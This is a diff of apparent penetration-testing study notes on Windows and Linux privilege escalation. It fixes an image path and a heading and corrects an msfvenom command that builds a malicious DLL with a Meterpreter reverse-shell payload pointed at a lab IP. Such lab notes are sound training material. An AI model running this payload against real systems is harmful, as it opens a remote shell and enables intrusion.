@@ -3065,7 +3065,7 @@ A non-privileged user attempting to execute a program with elevated privileges w
 
 Attacks can bypass UAC in order to execute malicious executables with elevated privileges.
 
-![UAC (User Account Control)](07_privilege_escalation_user_account_control.png)
+![UAC (User Account Control)](./assets/07_privilege_escalation_user_account_control.png)
 
 #### Bypassing UAC
 
@@ -3779,7 +3779,7 @@ _Set up a Metasploit listener to catch the reverse shell connection._
 
 _Create a malicious DLL using `msfvenom` that contains the reverse shell payload._
 
-`msfvenom -p widows/meterpreter/reverse_tcp LHOST=... LPORT=4444 -f dll -o /root/Desktop/DWrite.dll`:
+`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.39.2 LPORT=4444 -f dll -o /root/Desktop/DWrite.dll`:
 ```
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x86 from the payload
@@ -3885,10 +3885,9 @@ SeUndockPrivilege
 
 ---
 
-
 ## Linux Privilege Escalation
 
-### Locally Stored Credentials - Theory
+### Locally Stored Credentials - Lab
 
 #### Lab Environment
 
